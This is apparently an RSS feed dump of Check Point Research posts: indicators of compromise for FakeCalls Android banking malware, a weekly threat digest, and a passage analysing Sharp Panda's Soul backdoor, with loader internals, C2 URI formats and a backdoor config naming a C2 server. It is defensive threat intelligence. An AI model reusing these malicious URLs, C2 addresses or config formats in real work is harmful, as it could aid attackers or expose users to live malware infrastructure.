means:</p>\n\n\n\n<p>0e26be5dbdc3656b09cc6d7d231b2285a7e52a4dc42c63021b57ee40b9694f34</p>\n\n\n\n<p>2b003f6638b56a56bc4f59058fc5b8e0ca6f34b79b83145fe9d80a5653ee2c85</p>\n\n\n\n<p>2fc09a2a0426e1fca7d9675c2f1734e36b3a13c260044ee70a7893419ab1bbe2</p>\n\n\n\n<p>3038c7a9c170e974421c5389ecb24f1e27ff9ba178e6f7f4929e5c54cac0c658</p>\n\n\n\n<p>39c7f217e55809b762b998198f6ae1e30ed87f0838f8e01e3fd838a77831bd3d</p>\n\n\n\n<p>497b9561e84e5bab365fd5283d45f6c76555e89c0b0dc57a91b338bf30ab1a54</p>\n\n\n\n<p>49c460158f23d12200488612242d2b8f50fdad38d5edb006e8c3a90b8005172c</p>\n\n\n\n<p>4a422047bc0a2ca692b33a80740ab64a5bbc325c348d3d4eea0f304d3c256e03</p>\n\n\n\n<p>522b4b565f34309713497d5fa2bfb6aa403cf7547c1ba2c114fc59fa8252b472</p>\n\n\n\n<p>65e875b1eed232e462cb654b110a895e2c87d420c9ef21a53683e27bcbcfbcc6</p>\n\n\n\n<p>76b94289ad36015d91e26ef1298fc04ca6f7ad7be1fe2d07ecf8a12be20996f3</p>\n\n\n\n<p>7d55250d76fcc3006a7cb727ba7521e0f17f8fd9311cf799442b1a737702a028</p>\n\n\n\n<p>834e678c8bb755d6bd21a886a39fea19613fd80a3894e4d6ddff3652170a0464</p>\n\n\n\n<p>97d20d26826a83de014b6711b87f18a98464e07b6ebc3a0480e4007d2f47e603</p>\n\n\n\n<p>b7ee5e7a4b9937e5fd9eebed01eabc36b22c8c6931e63f934bbdb961346169b3</p>\n\n\n\n<p>cbcffbf761b644f20486f7164a3b97a7c083dfcd774ed0ebbbcd6109fd6c47e1</p>\n\n\n\n<p>cc4dc5afeb91ef2ad364cda511777b888a4ba9a90ae49e9181494b2ff32d50ed</p>\n\n\n\n<p>db9d55a7b05253fd7367c5fa25d07d6962c1a9b58a136f76c7ef236ad2aec94b</p>\n\n\n\n<p>de743563f41553f47bb7073ac28ed4d79e1a4031b3da732497805aa8a297943f</p>\n\n\n\n<p>f8823780d2822307e995528bd7a34a1735e66bd2fe22404e02053cb92b0a56cb</p>\n\n\n\n<p>Sample with all the evasion techniques described (also included Google Drive dead drop resolvers):<em><strong><br />f8823780d2822307e995528bd7a34a1735e66bd2fe22404e02053cb92b0a56cb</strong></em></p>\n\n\n\n<p>Sample with the arbitrary CnC resolution method:<em><strong><br />4a422047bc0a2ca692b33a80740ab64a5bbc325c348d3d4eea0f304d3c256e03</strong></em></p>\n\n\n\n<p>Sample with video stream functionality:<br /><em><strong>e8396aa5cccd30478e8fd0cf959ee996b6b727531bdece1ed63482b053c24004</strong></em></p>\n\n\n\n<h2 class=\"wp-block-heading\">URLs</h2>\n\n\n\n<p>The full list of dead drop resolvers:</p>\n\n\n\n<figure class=\"wp-block-embed\"><div class=\"wp-block-embed__wrapper\">\nhttps://drive.google.com/file/d/1L7CMBiv5NLIrCxmUpkXRZcyFqbgmcKy5/view?usp=sharing\n</div></figure>\n\n\n\n<figure class=\"wp-block-embed\"><div class=\"wp-block-embed__wrapper\">\nhttps://drive.google.com/file/d/1HZg40qw7DGgl2HT6ZuGkKLkf5a0DnaBT/view?usp=share_link\n</div></figure>\n\n\n\n<figure class=\"wp-block-embed\"><div class=\"wp-block-embed__wrapper\">\nhttps://www.daebak222.com/huhu/admin.txt\n</div></figure>\n\n\n\n<figure class=\"wp-block-embed\"><div class=\"wp-block-embed__wrapper\">\nhttps://182.16.42.18:5055/huhu/admin.txt\n</div></figure>\n\n\n\n<p>http://182.16.42.18:10102/Teamviewer/admin.txt</p>\n\n\n\n<p>http://182.16.42.18:10102/HanaBank/admin/admin.txt</p>\n\n\n\n<p>http://182.16.42.18:10102/HanaBank/admin.txt</p>\n\n\n\n<p>http://192.168.99.186:5000/admin.txt</p>\n\n\n\n<p>http://192.168.99.33:5055/admin.txt</p>\n\n\n\n<p>http://192.168.99.191:5055/admin.txt</p>\n\n\n\n<h1 class=\"wp-block-heading\">Sources</h1>\n\n\n\n<ol type=\"1\">\n<li>National Police Agency. Status of voice phishing //&nbsp;<a href=\"https://www.data.go.kr/data/15063815/fileData.do\">https://www.data.go.kr/data/15063815/fileData.do</a></li>\n\n\n\n<li>Voice phishing damage of 1.7 trillion won over the past 5 years&#8230; 170,000 victims //&nbsp;<a href=\"https://it.chosun.com/site/data/html_dir/2020/09/28/2020092802480.html\">https://it.chosun.com/site/data/html_dir/2020/09/28/2020092802480.html</a></li>\n\n\n\n<li>End of Central Directory Record //&nbsp;<a href=\"https://docs.fileformat.com/compression/zip/#end-of-central-directory-record\">https://docs.fileformat.com/compression/zip/#end-of-central-directory-record</a></li>\n\n\n\n<li>rtmp-rtsp-stream-client-java library //&nbsp;<a href=\"https://github.com/pedroSG94/rtmp-rtsp-stream-client-java\">https://github.com/pedroSG94/rtmp-rtsp-stream-client-java</a></li>\n</ol>\n<p>The post <a href=\"https://research.checkpoint.com/2023/south-korean-android-banking-menace-fakecalls/\" rel=\"nofollow\">South Korean Android Banking Menace \u2013 FakeCalls</a> appeared first on <a href=\"https://research.checkpoint.com\" rel=\"nofollow\">Check Point Research</a>.</p>"
                }
            ]
        },
        {
            "title": "13th March \u2013 Threat Intelligence Report",
            "title_detail": {
                "type": "text/plain",
                "language": null,
                "base": "https://research.checkpoint.com/feed/",
                "value": "13th March \u2013 Threat Intelligence Report"
            },
            "links": [
                {
                    "rel": "alternate",
                    "type": "text/html",
                    "href": "https://research.checkpoint.com/2023/13th-march-threat-intelligence-report/"
                }
            ],
            "link": "https://research.checkpoint.com/2023/13th-march-threat-intelligence-report/",
            "authors": [
                {
                    "name": "dants"
                }
            ],
            "author": "dants",
            "author_detail": {
                "name": "dants"
            },
            "published": "Mon, 13 Mar 2023 15:38:32 +0000",
            "published_parsed": [
                2023,
                3,
                13,
                15,
                38,
                32,
                0,
                72,
                0
            ],
            "tags": [
                {
                    "term": "Global Cyber Attack Reports",
                    "scheme": null,
                    "label": null
                }
            ],
            "id": "https://research.checkpoint.com/?p=27592",
            "guidislink": false,
            "summary": "<p>For the latest discoveries in cyber research for the week of 13th March, please download our Threat_Intelligence Bulletin TOP ATTACKS AND BREACHES Sensitive personal information of more than 56,000 Washington D.C. residents, including an undisclosed number of Senators and members of Congress, has been leaked on a darkweb forum. The leak occurred after the D.C. [&#8230;]</p>\n<p>The post <a href=\"https://research.checkpoint.com/2023/13th-march-threat-intelligence-report/\" rel=\"nofollow\">13th March \u2013 Threat Intelligence Report</a> appeared first on <a href=\"https://research.checkpoint.com\" rel=\"nofollow\">Check Point Research</a>.</p>",
            "summary_detail": {
                "type": "text/html",
                "language": null,
                "base": "https://research.checkpoint.com/feed/",
                "value": "<p>For the latest discoveries in cyber research for the week of 13th March, please download our Threat_Intelligence Bulletin TOP ATTACKS AND BREACHES Sensitive personal information of more than 56,000 Washington D.C. residents, including an undisclosed number of Senators and members of Congress, has been leaked on a darkweb forum. The leak occurred after the D.C. [&#8230;]</p>\n<p>The post <a href=\"https://research.checkpoint.com/2023/13th-march-threat-intelligence-report/\" rel=\"nofollow\">13th March \u2013 Threat Intelligence Report</a> appeared first on <a href=\"https://research.checkpoint.com\" rel=\"nofollow\">Check Point Research</a>.</p>"
            },
            "content": [
                {
                    "type": "text/html",
                    "language": null,
                    "base": "https://research.checkpoint.com/feed/",
                    "value": "<p>For the latest discoveries in cyber research for the week of 13th March, please download our <a href=\"https://research.checkpoint.com/wp-content/uploads/2023/03/Threat_Intelligence_News_2023-03-13.pdf\">Threat_Intelligence Bulletin</a></p>\n<p><strong>TOP ATTACKS AND BREACHES</strong></p>\n<ul>\n<li>Sensitive personal information of more than 56,000 Washington D.C. residents, including an undisclosed number of Senators and members of Congress, has been <a href=\"https://www.nytimes.com/2023/03/10/us/politics/dc-hack-data-congress-health-marketplace.html\">leaked</a> on a darkweb forum. The leak occurred after the D.C. Health Link marketplace, a health insurance marketplace used by businesses and residents of Washington D.C. was breached.</li>\n<li>Medusa and Vice Society ransomware groups leaked sensitive data that was stolen from <a href=\"https://therecord.media/minneapolis-public-schools-still-investigating-what-caused-encryption-event\">Minneapolis Public Schools</a> and <a href=\"https://www.databreaches.net/highly-sensitive-files-from-berkeley-county-schools-dumped-by-ransomware-gang/\">West Virginia Berkeley County Schools</a>, respectively, in February ransomware attacks. Last year, the Vice Society group has <a href=\"https://www.bleepingcomputer.com/news/security/vice-society-claims-lausd-ransomware-attack-theft-of-500gb-of-data/\">targeted</a> the Los Angeles Unified school district.</li>\n</ul>\n<p style=\"padding-left: 40px;\"><em>Check Point Threat Emulation provides protection against these threats </em><em>(Trojan.Wins.ViceSociety.*, Ransomware.Wins.Medusalocker.*)</em></p>\n<ul>\n<li>Israel\u2019s National Cyber Directorate has <a href=\"https://www.timesofisrael.com/israel-publicly-blames-iran-for-cyberattack-on-major-university-last-month/\">asserted</a> that Iranian APT group MuddyWater, known to be affiliated with Iran\u2019s Ministry of Intelligence and Security, is behind the cyberattack on the Technion, one of Israel\u2019s leading universities. The attack was masked as a regular ransomware attack and had significantly disrupted the university\u2019s activities.</li>\n</ul>\n<p><em>\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 Check Point Harmony Endpoint and Threat Emulation provide protection against this threat.</em></p>\n<ul>\n<li>American telecom giant AT&amp;T has <a href=\"https://www.securityweek.com/millions-of-att-customers-notified-of-data-breach-at-third-party-vendor/\">notified</a> 9 million customers that some of their information was leaked in a data breach at a third party marketing vendor. According to AT&amp;T, sensitive financial and personal information was not impacted in the breach.</li>\n<li>After a three month period of no observed activity, a new Emotet malware campaign has been <a href=\"https://www.darkreading.com/threat-intelligence/emotet-resurfaces-yet-again-after-three-month-hiatus\">detected</a> in the wild. Emotet, which is delivered via malicious email messages, can deploy various additional malware (including ransomware) once it has successfully infected a victim\u2019s network.</li>\n</ul>\n<p style=\"padding-left: 40px;\"><em>Check Point Harmony Endpoint, Threat Emulation, IPS and Anti Bot provide protection against this threat </em><em>(Trojan.Wins.Emotet.*; Worm.Win.Emotet.*; Emotet Exploit Kit Landing Page; Emotet Maldoc Download Page; Dropper.Win.GenDrop.la.E; Trojan.Win32.Emotet)</em></p>\n<ul>\n<li>One of the largest engineering firms in Canada, Black &amp; McDonald, has <a href=\"https://www.ctvnews.ca/business/ransomware-attack-hits-canadian-engineering-company-working-on-military-bases-power-plants-1.6304657/\">suffered</a> a ransomware attack. The firm, which is a prominent contractor for the Canadian Department of Nation Defense, has not disclosed the impact of the attack.</li>\n</ul>\n<p><strong>VULNERABILITIES AND PATCHES</strong></p>\n<ul>\n<li>Google has <a href=\"https://source.android.com/docs/security/bulletin/2023-03-01\">published</a> Android\u2019s security advisory for the month of March. The patch contains fixes for dozens of vulnerabilities affecting Android\u2019s system and various components. Some of the vulnerabilities are considered critical, and could lead to remote code execution on an unpatched Android device.</li>\n<li>Cisco has <a href=\"https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-bfd-XmRescbT\">released</a> a security patch to address CVE-2023-20049, a denial of service vulnerability affecting many of the company\u2019s router products. The vulnerability allowed remote attackers to send malformed packets that would cause the router\u2019s line card to reset, triggering the denial of service condition.</li>\n<li>Fortinet has released an advisory <a href=\"https://www.fortiguard.com/psirt/FG-IR-23-001\">covering</a> CVE-2023-25610, a critical heap buffer underflow vulnerability affecting many of its products. The vulnerability is of critical severity, and could lead to either denial of service or remote code execution on unpatched Fortinet products.</li>\n</ul>\n<p><strong>THREAT </strong><strong>INTELLIGENCE REPORT</strong></p>\n<ul>\n<li>Check Point researchers have <a href=\"https://research.checkpoint.com/2023/pandas-with-a-soul-chinese-espionage-attacks-against-southeast-asian-government-entities/\">uncovered</a> a cyber-espionage campaign by Chinese APT group SharpPanda. The campaign has targeted government entities in South-East Asia, and has utilized the Soul framework to establish access to vicitms\u2019 network and exfiltrate information.</li>\n</ul>\n<p><em>\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 Check Point Threat Emulation and Anti-bot provide protection against this threat (</em><em>Trojan.WIN32.SharpPanda)</em></p>\n<ul>\n<li>Check Point Research <a href=\"https://blog.checkpoint.com/2023/03/09/february-2023s-most-wanted-malware-remcos-trojan-linked-to-cyberespionage-operations-against-ukrainian-government/\">reports</a> that\u00a0Remcos Trojan return to the top ten list for the first time since December 2022 after it was reported being used by threat actors to target Ukranian government entities through phishing attacks. Meanwhile, Emotet Trojan and Formbook Infostealer climbed the ranking taking second and third place respectively.</li>\n</ul>\n<ul>\n<li>Researchers have observed multiple campaigns abusing Google advertisements to lead users to download malicious droppers masked as legitimate programs. In one campaign, the end stage payload was the <a href=\"https://securelist.com/malvertising-through-search-engines/108996/\">RedLine</a> stealer, while another would lead to <a href=\"https://securelist.com/malvertising-through-search-engines/108996/\">Ursnif or Vidar</a></li>\n</ul>\n<p style=\"padding-left: 40px;\"><em>Check Point Threat Emulation provide protection against these threats (</em><em>Trojan.Wins.RedLineStealer.ta.A/B/E and Infostealer.Win.RedLine.A-D)</em></p>\n<ul>\n<li>Analysis of a campaign targeting Indian and Pakistani Android users has been <a href=\"https://www.welivesecurity.com/2023/03/07/love-scam-espionage-transparent-tribe-lures-indian-pakistani-officials/\">published</a>. The targets were approached by romance scams on messaging apps, and were then convinced to chat via a supposedly more secure app, which turned out to be a remote access Trojan.</li>\n<li>A Chinese campaign targeting SonicWall Secure Mobile Access devices was <a href=\"https://www.mandiant.com/resources/blog/suspected-chinese-persist-sonicwall\">discovered</a>. In the campaign, the threat actors used a sophisticated malware capable of maintaining persistence in SonicWall security appliances even after firmware upgrades. The malware allowed theft of credentials and shell access to the device.</li>\n</ul>\n<p>The post <a href=\"https://research.checkpoint.com/2023/13th-march-threat-intelligence-report/\" rel=\"nofollow\">13th March \u2013 Threat Intelligence Report</a> appeared first on <a href=\"https://research.checkpoint.com\" rel=\"nofollow\">Check Point Research</a>.</p>"
                }
            ]
        },
        {
            "title": "Pandas with a Soul: Chinese Espionage Attacks Against Southeast Asian Government Entities",
            "title_detail": {
                "type": "text/plain",
                "language": null,
                "base": "https://research.checkpoint.com/feed/",
                "value": "Pandas with a Soul: Chinese Espionage Attacks Against Southeast Asian Government Entities"
            },
            "links": [
                {
                    "rel": "alternate",
                    "type": "text/html",
                    "href": "https://research.checkpoint.com/2023/pandas-with-a-soul-chinese-espionage-attacks-against-southeast-asian-government-entities/"
                }
            ],
            "link": "https://research.checkpoint.com/2023/pandas-with-a-soul-chinese-espionage-attacks-against-southeast-asian-government-entities/",
            "authors": [
                {
                    "name": "etal"
                }
            ],
            "author": "etal",
            "author_detail": {
                "name": "etal"
            },
            "published": "Tue, 07 Mar 2023 11:05:35 +0000",
            "published_parsed": [
                2023,
                3,
                7,
                11,
                5,
                35,
                1,
                66,
                0
            ],
            "tags": [
                {
                    "term": "Check Point Research Publications",
                    "scheme": null,
                    "label": null
                }
            ],
            "id": "https://research.checkpoint.com/?p=27541",
            "guidislink": false,
            "summary": "<p>Executive summary In 2021, Check Point Research&#160;published&#160;a report on a previously undisclosed toolset used by&#160;Sharp Panda, a long-running Chinese cyber-espionage operation targeting Southeast Asian government entities. Since then, we have continued to track the use of these tools across several operations in multiple Southeast Asian countries, in particular nations with similar territorial claims or strategic [&#8230;]</p>\n<p>The post <a href=\"https://research.checkpoint.com/2023/pandas-with-a-soul-chinese-espionage-attacks-against-southeast-asian-government-entities/\" rel=\"nofollow\">Pandas with a Soul: Chinese Espionage Attacks Against Southeast Asian Government Entities</a> appeared first on <a href=\"https://research.checkpoint.com\" rel=\"nofollow\">Check Point Research</a>.</p>",
            "summary_detail": {
                "type": "text/html",
                "language": null,
                "base": "https://research.checkpoint.com/feed/",
                "value": "<p>Executive summary In 2021, Check Point Research&#160;published&#160;a report on a previously undisclosed toolset used by&#160;Sharp Panda, a long-running Chinese cyber-espionage operation targeting Southeast Asian government entities. Since then, we have continued to track the use of these tools across several operations in multiple Southeast Asian countries, in particular nations with similar territorial claims or strategic [&#8230;]</p>\n<p>The post <a href=\"https://research.checkpoint.com/2023/pandas-with-a-soul-chinese-espionage-attacks-against-southeast-asian-government-entities/\" rel=\"nofollow\">Pandas with a Soul: Chinese Espionage Attacks Against Southeast Asian Government Entities</a> appeared first on <a href=\"https://research.checkpoint.com\" rel=\"nofollow\">Check Point Research</a>.</p>"
            },
            "content": [
                {
                    "type": "text/html",
                    "language": null,
                    "base": "https://research.checkpoint.com/feed/",
                    "value": "<h2 class=\"wp-block-heading\">Executive summary</h2>\n\n\n\n<p>In 2021, Check Point Research&nbsp;published&nbsp;a report on a previously undisclosed toolset used by&nbsp;<a href=\"https://research.checkpoint.com/2021/chinese-apt-group-targets-southeast-asian-government-with-previously-unknown-backdoor/\">Sharp Panda</a>, a long-running Chinese cyber-espionage operation targeting Southeast Asian government entities. Since then, we have continued to track the use of these tools across several operations in multiple Southeast Asian countries, in particular nations with similar territorial claims or strategic infrastructure projects such as Vietnam, Thailand, and Indonesia.</p>\n\n\n\n<p><strong><u>Key findings:</u></strong></p>\n\n\n\n<ul>\n<li>In late 2022, a campaign with an initial infection vector similar to previous Sharp Panda operations targeted a high-profile&nbsp;<strong>government entity</strong>&nbsp;in the region.</li>\n\n\n\n<li>While Sharp Panda\u2019s previous campaigns delivered a custom and unique backdoor called&nbsp;VictoryDll, the payload in this specific attack is a new version of&nbsp;<strong>SoulSearcher loader,</strong>&nbsp;which eventually loads&nbsp;<strong>the Soul modular framework.</strong>&nbsp;Although samples of this framework from 2017-2021 were previously&nbsp;<a href=\"https://www.fortinet.com/blog/threat-research/unraveling-the-evolution-of-the-soul-searcher-malware\">analyzed</a>, this report is the most extensive look yet at the Soul malware family infection chain, including a full technical analysis of the latest version, compiled in late 2022.</li>\n\n\n\n<li>Although the Soul malware framework was previously&nbsp;<a href=\"https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/espionage-campaign-south-east-asia\">seen</a>&nbsp;in an espionage campaign targeting the defense, healthcare, and ICT sectors in Southeast Asia, it was never previously attributed or connected to any known cluster of malicious activity. Although it is currently not clear if the Soul framework is utilized by a single threat actor, based on our research we can attribute the framework to an APT group with Chinese origins.</li>\n\n\n\n<li>The connection between the tools and TTPs (Tactics, Techniques and Procedures) of Sharp Panda and the previously mentioned attacks in Southeast Asia might serve as yet another example of key characteristics inherent to Chinese-based APT operations, such as sharing custom tools between groups or task specialization, when one entity is responsible for the initial infection and another one performs the actual intelligence gathering.</li>\n</ul>\n\n\n\n<h2 class=\"wp-block-heading\">Introduction</h2>\n\n\n\n<p>At the beginning of 2021, Check Point Research&nbsp;<a href=\"https://research.checkpoint.com/2021/chinese-apt-group-targets-southeast-asian-government-with-previously-unknown-backdoor/\">identified</a>&nbsp;an ongoing surveillance operation we named Sharp Panda that was targeting Southeast Asian government entities. The attackers used spear-phishing emails to gain initial access to the targeted networks. These emails typically contained a Word document with government-themed lures that leveraged a remote template to download and run a malicious RTF document, weaponized with the infamous RoyalRoad kit. Once inside, the malware starts a chain of in-memory loaders, comprised of a custom DLL downloader we call&nbsp;<strong>5.t Downloader</strong>&nbsp;and a second-stage loader responsible for the delivery of a final backdoor. The final payload observed in Sharp Panda campaigns at the time was&nbsp;<strong>VictoryDll,</strong>&nbsp;a custom and unique malware that enabled remote access and data collection from the infected device. We tracked several earlier versions of the VictoryDll backdoor back to at least 2017, with the whole operation remaining under the radar the entire time.</p>\n\n\n\n<p>Further tracking of Sharp Panda tools revealed multiple campaigns that targeted entities in Southeast Asian countries, such as Vietnam, Indonesia, and Thailand. During this time, multiple minor changes were implemented in the 5.t Downloader itself, but in general, the initial part of the infection chain (the use of Word documents, RoyalRoad RTF and 5.t Downloader) remained the same. However, in early 2023, when investigating an attack against one of the government entities located in the targeted region, the payload received from the actor\u2019s geo-fenced C&amp;C server was different from the VictoryDll backdoor observed before. Further analysis revealed that this payload is a new version of&nbsp;<a href=\"https://www.fortinet.com/blog/threat-research/unraveling-the-evolution-of-the-soul-searcher-malware\">SoulSearcher</a>&nbsp;loader, which is responsible for downloading, decrypting, and loading in memory other modules of the&nbsp;<strong>Soul modular backdoor</strong>.</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter\"><img alt=\"Figure 1 - The infection chain.\" src=\"https://research.checkpoint.com/wp-content/uploads/2023/03/NDB7HW48QG-image1.png\" /><figcaption class=\"wp-element-caption\">Figure 1 &#8211; The infection chain.</figcaption></figure></div>\n\n\n<p>The use of the Soul malware framework was&nbsp;<a href=\"https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/espionage-campaign-south-east-asia\">described</a>&nbsp;by Symantec in relation to the unattributed espionage operation targeting defense, healthcare, and ICT sectors in Southeast Asia in 2020-2021. Following up on that report, Fortinet researchers discovered other samples from 2017-2021 and&nbsp;<a href=\"https://www.fortinet.com/blog/threat-research/unraveling-the-evolution-of-the-soul-searcher-malware\">described</a>&nbsp;the evolution of the framework. Soul was also&nbsp;<a href=\"https://cmccybersecurity.com/en/cmc-canh-bao-chien-dich-apt-moi-loi-dung-unikey-tan-cong-nguoi-dung-viet-nam/\">seen</a>&nbsp;in 2019 in attacks against Vietnamese targets. None of these public reports attributed the Soul framework to any specific country or known actor, although researchers noted the \u201ccompetent adversarial tradecraft\u201d which they believed indicated a \u201cpossibly state-sponsored\u201d group.</p>\n\n\n\n<p>In this report, we provide a detailed technical explanation of several malicious stages used in this infection chain and the latest changes implemented in the Soul framework. We also discuss the challenges in attributing these attacks.</p>\n\n\n\n<h2 class=\"wp-block-heading\">Downloader</h2>\n\n\n\n<p>The downloader, which in this specific case was dropped by RoyalRoad RTF to the disk as&nbsp;<code>res6.a</code>, is executed by a scheduled task with&nbsp;<code>rundll32.exe, StartA</code>. Its functionality is consistent with previous&nbsp;<a href=\"https://research.checkpoint.com/2021/chinese-apt-group-targets-southeast-asian-government-with-previously-unknown-backdoor/\">research</a>&nbsp;of Sharp Panda activity. Similar to previous Sharp Panda campaigns, the C&amp;C servers of the attackers are geofenced and return payloads only to requests from the IP addresses of the countries where the targets are located.</p>\n\n\n\n<p>In the latest campaign, the actors implemented some changes in the downloader\u2019s communication with the C&amp;C. Previously, the entire C&amp;C communication was based on sending data encrypted using RC4 and encoded with base64, with an exception for the HTTP request for payload which contained the hostname in plain text in the URI:&nbsp;<code>/[**hostname]**.html.</code></p>\n\n\n\n<p>However, in the new samples, the payload request is issued to the same PHP path as all the previous requests, with the host specified in its parameter, both MD5-hashed and in clear-text:&nbsp;<code>[host_name]*[host_name_md5]</code>, e.g.&nbsp;<code>MyComputer*d2122d4f4cdf26faa1b2f73bda6030f4</code>&nbsp;and then encoded:</p>\n\n\n\n<p><code>/[php_name].php?Data=[encoded&lt;host_name_and_host_md5&gt;]</code></p>\n\n\n\n<p>It\u2019s noteworthy that while different keys were used, the encoding method using RC4+Base64 remained consistent in all cases.</p>\n\n\n\n<p>In addition to changes in the URL patterns, the actors refrained from using the distinctive User-Agent&nbsp;<code>\u201cMicrosoft Internet Explorer\u201d</code>&nbsp;and instead used a hardcoded generic one. A few of the samples we observed also communicated through HTTPS, not HTTP. Unlike the previous version where only the API calls were obfuscated, the new version also uses string encryption. However, the encryption is quite simple and consists of loop XORing an encrypted character with the difference of a loop index and a constant value:</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter\"><img alt=\"Figure 2 - String decryption routine in the newest version of 5.t Downloader.\" src=\"https://research.checkpoint.com/wp-content/uploads/2023/03/NDB7HW48QG-image2.png\" /><figcaption class=\"wp-element-caption\">Figure 2 &#8211; String decryption routine in the newest version of 5.t Downloader.</figcaption></figure></div>\n\n\n<p>As in previous versions, the downloader gathers data from the victim\u2019s computer including hostname, OS name and version, system type (32/64 bit), username, MAC addresses of the networking adapters, and information on anti-virus solutions. If the threat actors find the victim\u2019s machine to be a promising target, the response from the server contains the next stage executable in encrypted form and its MD5 checksum. After verifying the integrity of the received message, the downloader loads the decrypted DLL to memory and starts its execution from the&nbsp;<code>StartW</code>&nbsp;export function (the same name as the next stage loader export in previous campaigns that used the downloader).</p>\n\n\n\n<h2 class=\"wp-block-heading\">SoulSearcher loader</h2>\n\n\n\n<p>SoulSearcher is a second-stage loader, which according to Fortinet&nbsp;<a href=\"https://www.fortinet.com/blog/threat-research/unraveling-the-evolution-of-the-soul-searcher-malware\">research</a>&nbsp;was seen in the wild since at least November 2018 and is responsible for executing the Soul backdoor main module and parsing its configuration. SoulSearcher has multiple variants based on where the configuration and payload are located and on the type of configuration. Among the samples used in the more recent activity cluster we have been researching, the SoulSearcher DLL (sha256: d1a6c383de655f96e53812ee1dec87dd51992c4be28471e44d7dd558585312e0) was slightly different from any previously discovered samples, with the backdoor embedded inside the data section and the embedded configuration in XML format.</p>\n\n\n\n<p>The malware checks if it runs under a process named&nbsp;<code>svchost.exe</code>,&nbsp;<code>msdtc.exe</code>&nbsp;or&nbsp;<code>spoolsv.exe</code>. If it does, it starts a thread on&nbsp;<code>StartW</code>&nbsp;export and continues loading the backdoor. This might be an indication of the loader being used in different infection chains than we observed in this attack with the rundll32.exe directly starting a chain of in-memory DLL loaders from&nbsp;<code>StartW</code>.</p>\n\n\n\n<p>The payload loading process starts with obtaining the configuration. While previously seen XML SoulSearchers retrieved this from the registry, a file mapping object, or a file on the disk, the newest version loads the config from a hardcoded Base64 string and stores it in the registry path&nbsp;<code>HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\CTF\\CONFIGEX</code>. The decoded data blob can be represented with the following struct:</p>\n\n\n\n<pre class=\"EnlighterJSRAW\">struct compressed_data\n{\n  DWORD magic;\n  DWORD unused;\n  BYTE lzma_properties[5];\n  DWORD size;\n  DWORD compressed_size;\n  BYTE decompressed_data_MD5[33];\n  BYTE compressed_data_MD5[33];\n  BYTE compressed_data[];\n};</pre>\n\n\n\n<p>The loader contains a compressed Soul backdoor DLL in the data section of the loader, while previous samples stored it in the overlay.</p>\n\n\n\n<p>Next, based on the system architecture, SoulSearcher appends&nbsp;<code>32</code>&nbsp;or&nbsp;<code>64</code>&nbsp;to the wide string&nbsp;<code>L'ServerBase'</code>, hashes the resulting string&nbsp;with MD5, and creates the registry key with this hash:&nbsp;<code>HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\CTF\\Assemblies\\[ServerBaseArch_md5]</code>.&nbsp;The value contains the compressed payload.</p>\n\n\n\n<p>If the registry key is successfully created, the loader reads the compressed payload and proceeds to decrypt and load it in memory. The loading process itself is not different from previously discussed variants of SoulSearcher: it uses the&nbsp;<code>compressed_data</code>&nbsp;structure from the configuration to validate MD5 checksums, LZMA-decompress the compressed module, and reflectively load the Soul main module DLL in memory.</p>\n\n\n\n<p>After loading the backdoor, Soul Searcher resolves the&nbsp;<code>Construct</code>&nbsp;export of the backdoor and calls it with the arguments&nbsp;<code>[ServerBaseArch_md5] -Startup</code>.</p>\n\n\n\n<h2 class=\"wp-block-heading\">Soul Backdoor (main module)</h2>\n\n\n\n<p>The Soul main module is responsible for communicating with the C&amp;C server and its primary purpose is to receive and load in memory additional modules. Interestingly, the backdoor configuration contains a \u201cradio silence\u201d-like feature, where the actors can specify specific hours in a week when the backdoor is not allowed to communicate with the C&amp;C server.</p>\n\n\n\n<p>The recovered sample of the backdoor is quite different from the samples that were previously analyzed. The new version of SoulBackdoor was compiled on&nbsp;<code>29/11/2022 02:12:34 UTC</code>.&nbsp;Based on their timestamps, the earlier samples analyzed by other researchers are mostly from 2017 with the exception of one from 2018, which, similar to our case, was embedded inside the SoulSearcher loader.</p>\n\n\n\n<p>The backdoor implements a custom C&amp;C protocol, which is entirely different than previously observed versions. Both the old and new versions are based on HTTP communication, but the latest version seems to be more complex and uses various HTTP request methods such as&nbsp;<code>GET</code>,&nbsp;<code>POST</code>, and&nbsp;<code>DELETE</code>. The API endpoints are also different, and the C&amp;C requests contain additional HTTP request headers. In terms of the backdoor functionality, the enumeration data is different from the previous versions and is more extensive. The supported C&amp;C commands, with the newer variant primarily focused on loading additional modules, lack any type of common backdoor functionality like manipulating local files, sending files to the C&amp;C, and executing remote commands.</p>\n\n\n\n<h3 class=\"wp-block-heading\">Configuration and execution flow</h3>\n\n\n\n<p>The backdoor requires two arguments or the&nbsp;<code>\u201c-v\u201d</code>&nbsp;argument before performing its activity. As we mentioned earlier, in our case it is executed by SoulSearcher with <code>[ServerBaseArch_md5] -Startup</code>&nbsp;arguments.</p>\n\n\n\n<p>Soul backdoor first creates an event using the hardcoded name&nbsp;<code>Global\\3GS7JR4S</code>&nbsp;and checks the registry key&nbsp;<code>HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\CTF</code>. It then uses the same configuration (from the registry key&nbsp;<code>HKEY_CURRENT_USER\\SOFTWARE\\Software\\Microsoft\\CTF\\CONFIGEX</code>) with the&nbsp;<code>compressed_data</code>&nbsp;struct (as used by SoulSearcher) to extract the payload and decompress its own configuration. The configuration of the main module provides the parameters of C&amp;C communication and other aspects of the backdoor execution. The compression algorithm is LZMA, similar to that found in older variants. After decompression, the config looks like this:</p>\n\n\n\n<pre class=\"EnlighterJSRAW\">&lt;CONFIG FLAG=\"X6bmLMbAL29AlxB\">\n  &lt;BASE>\n    &lt;Ip>http://103.159.132.96/index.php&lt;/Ip>\n    &lt;Dns>8.8.8.8|114.114.114.114|&lt;/Dns>\n    &lt;Proxy>&lt;/Proxy>\n    &lt;CntPort>80|443&lt;/CntPort>\n    &lt;LstPort>0&lt;/LstPort>\n    &lt;Blog>NULL&lt;/Blog>\n    &lt;DropboxBlog>NULL&lt;/DropboxBlog>\n    &lt;HTTPS>false&lt;/HTTPS>\n  &lt;/BASE>\n  &lt;SVC>\n    